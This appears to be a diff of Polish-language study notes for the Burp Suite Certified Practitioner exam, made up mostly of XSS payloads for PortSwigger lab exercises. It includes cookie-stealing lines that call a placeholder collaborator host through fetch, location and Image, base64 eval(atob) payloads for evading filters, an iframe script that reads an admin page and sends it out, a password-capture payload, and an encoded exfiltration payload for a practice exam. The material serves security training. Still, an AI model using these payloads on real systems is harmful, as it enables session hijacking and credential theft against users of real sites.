@@ -1,15 +1,21 @@
+ jeśli sink to innerHTML, payload musi być HTML. 
+Jeśli sink to eval, payload musi być JS.
 
+
+postMessage gdy sink nasłuchuje na wiadomości (addListener)
+location= gdy sink jest w URL
+iframe gdy musisz załadować stronę ofiary w tle.
 
   Metody dostarczenia danych w XSS
 
-1. fetch (najlepsza) "wyślij dane stąd tam"
+1. fetch (najlepsza) "wyślij dane stąd tam" -> gdy chcesz wysłać dane w tle bez przekierowania (wymaga CORS lub same-site)
 javascriptfetch('https://collaborator.com', {
   method: 'POST',
   body: document.cookie
 })
 ✅ Nowoczesna, czysta, nie widoczna dla ofiary
 
-2. location (redirect)  -> omija cors
+2. location (redirect)  -> omija cors -> gdy CORS blokuje fetch, przekierowuje przeglądarkę z cookie w URL
 javascriptdocument.location='https://collaborator.com/?c='+document.cookie
 ✅ Prosta, działa wszędzie
 ❌ Przekierowuje ofiarę – widzi że coś się dzieje
@@ -27,7 +33,232 @@ javascriptnew Image().src='https://collaborator.com/?c='+document.cookie
 ✅ Działa nawet gdy fetch/XHR zablokowane
 ❌ Ograniczona długość URL
 
-5. iframe src "załaduj tamtą stronę tutaj"
+5. iframe src "załaduj tamtą stronę tutaj" -> gdy chcesz załadować inną stronę w tle i odczytać jej zawartość (same-origin)
 javascriptdocument.location='https://collaborator.com/?c='+document.cookie
 html<iframe src="https://collaborator.com/?c="+document.cookie>
 ❌ Nie wysyła cookie automatycznie
+
+6.  eval gdy payload jest zakodowany (np. atob) i trzeba go wykonać
+
+7. atob() → gdy WAF/filtr blokuje słowa kluczowe — zakoduj payload w base64
+
+
+***********************************************************************************************************************
+# BSCP — XSS Exploit Decision Guide
+
+## Krok 1: Znajdź sink
+
+Otwórz DevTools → Sources → znajdź skrypt obsługujący twój input.
+Lub Network → Response → szukaj swojej wartości w kodzie.
+
+---
+
+## Krok 2: Kontekst → payload
+
+| Kontekst | Przykład w kodzie | Payload |
+|---|---|---|
+| HTML body | `<p>INPUT</p>` | `<img src=x onerror=alert(1)>` |
+| Atrybut HTML | `<input value="INPUT">` | `"><img src=x onerror=alert(1)>` |
+| href atrybut | `<a href="INPUT">` | `javascript:alert(1)` |
+| JS string | `var x = "INPUT"` | `"-alert(1)-"` |
+| JS eval | `eval('var x = ' + input)` | `\"-alert(1)//` |
+| JS innerHTML | `el.innerHTML = INPUT` | `<img src=x onerror=alert(1)>` |
+| JS eval + JSON | `eval('var obj = ' + json)` | `\"-fetch('...')//` |
+
+---
+
+## Krok 3: Exfiltracja cookie — co użyć
+
+### `location=` (PREFEROWANE)
+```javascript
+location='https://COLLABORATOR/?c='+document.cookie
+```
+**Kiedy:** zawsze jako pierwsza próba — nie ma problemu z CORS, przekierowuje przeglądarkę.
+
+---
+
+### `fetch()`
+```javascript
+fetch('https://COLLABORATOR/?c='+document.cookie)
+```
+**Kiedy:** gdy NIE chcesz przekierować użytkownika (żeby nie zauważył).
+**Problem:** blokowany przez CORS — wtedy przejdź na `location=`.
+
+---
+
+### `iframe`
+```javascript
+// Wczytaj stronę i odczytaj jej zawartość
+var i = document.createElement('iframe');
+i.src = '/admin';
+i.onload = function() {
+  fetch('https://COLLABORATOR/?c='+i.contentDocument.body.innerHTML);
+};
+document.body.appendChild(i);
+```
+**Kiedy:** chcesz odczytać zawartość innej strony same-origin (np. panel admina, sekretny endpoint).
+
+---
+
+### `eval()`
+```javascript
+eval(atob('BASE64_PAYLOAD'))
+```
+**Kiedy:** WAF blokuje słowa kluczowe (`fetch`, `cookie`, `document`) — zakoduj payload w base64 i wykonaj przez eval.
+
+---
+
+### `atob()`
+```javascript
+eval(atob('ZmV0Y2goJ2h0dHBzOi8vQ09MTEFCT1JBVE9SLz9jPScrZG9jdW1lbnQuY29va2llKQ=='))
+```
+**Kiedy:** razem z eval — omija filtry słownikowe.
+Zakoduj: `btoa("fetch('https://COLLAB/?c='+document.cookie)")`
+
+---
+
+## Krok 4: Delivery przez exploit server
+
+```html
+<script>
+location = "https://LAB.web-security-academy.net/?param=PAYLOAD";
+</script>
+```
+
+**Zasady escape w stringu JS:**
+- Jeśli payload zawiera `"` → zastąp `\"`
+- Jeśli jesteś w eval/JSON sink → backslash eskejpuje cudzysłów w JSON
+- Jeśli kontekst HTML → `\\` w HTML stringu = `\` w URL
+
+---
+
+## Krok 5: Debugowanie
+
+| Problem | Przyczyna | Fix |
+|---|---|---|
+| Console pusta, brak przekierowania | Skrypt się nie wykonuje | Sprawdź Content-Type exploit servera (musi być text/html) |
+| CORS error w Console | fetch() blokowany | Zamień na `location=` |
+| View exploit wraca na exploit server | `location=` w skrypcie działa poprawnie | Normalny objaw — dostarcz ofierze |
+| 500 Internal Server Error | Payload zepsuty | Sprawdź enkodowanie / cudzysłowy |
+| Cookie widoczne w błędzie CORS | Payload wykonany, tylko transport zły | Zmień fetch na location |
+
+---
+
+## Krok 6: Schemat decyzyjny
+
+```
+Czy input ląduje w HTML?
+├─ TAK → <script> lub onerror
+└─ NIE → czy ląduje w JS stringu?
+         ├─ TAK → zamknij string, wstrzyknij kod
+         └─ NIE → czy ląduje w eval()?
+                  └─ TAK → zamknij string + atob jeśli filtr
+
+Chcesz exfiltrować cookie?
+├─ Najpierw: location=
+├─ Jeśli filtr słów: eval(atob('...'))
+└─ Jeśli chcesz odczytać inną stronę: iframe
+
+Delivery?
+└─ Exploit server → <script>location="LAB_URL?param=PAYLOAD"</script>
+```
+
+---
+
+## Przydatne snippety
+
+```javascript
+// Generuj base64 w konsoli przeglądarki
+btoa("fetch('https://COLLAB/?c='+document.cookie)")
+
+// Sprawdź cookie
+document.cookie
+
+// Iframe + exfiltracja
+var i=document.createElement('iframe');
+i.src='/admin';
+i.onload=()=>location='https://COLLAB/?c='+i.contentDocument.body.innerHTML;
+document.body.appendChild(i);
+*********************************************************************************************************************
+
+
+wszystkie payloady DOM XSS
+
+addEventListener()
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+
+addEventListener(), location.href
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+
+JSON.parse(), load channel
+<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+
+open redirect
+<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
+https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
+
+lastViewedProduct cookie
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
+
+document.write, location.search
+"><svg onload=alert(1)>
+
+innerHTML sink using source location.search
+<img src=1 onerror=alert(1)>
+
+href attribute sink using location.search source. Change returnPath to:
+javascript:alert(document.cookie)
+
+hash change event
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+attribute with angle brackets HTML-encoded
+"onmouseover="alert(1)
+
+JavaScript string with angle brackets HTML encoded
+'-alert(1)-'
+
+document.write sink using source location.search inside a select element
+product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
+
+AngularJS expression with angle brackets and double quotes HTML-encoded
+{{$on.constructor('alert(1)')()}}
+
+Stored DOM XSS
+<><img src=1 onerror=alert(1)>
+
+HTML context with most tags and attributes blocked
+<img src=1 onerror=print()>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
+HTML context with all tags blocked except custom ones
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+
+Reflected XSS with some SVG markup allowed
+https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+
+Exploiting cross-site scripting to steal cookies
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+
+Exploiting cross-site scripting to capture passwords
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+PRACTISE EXAM PAYLOAD
+<script>
+location = "https://0a9e000d047376a4804a128f00690043.web-security-academy.net/?SearchTerm=\"-eval(atob('bG9jYXRpb249J2h0dHBzOi8vamQwY2Q0d2pxZGNrZ2FqOTFzeTloZ3k1M3c5bnhmbDQub2FzdGlmeS5jb20vP2M9Jytkb2N1bWVudC5jb29raWU='))-\"";
+</script>
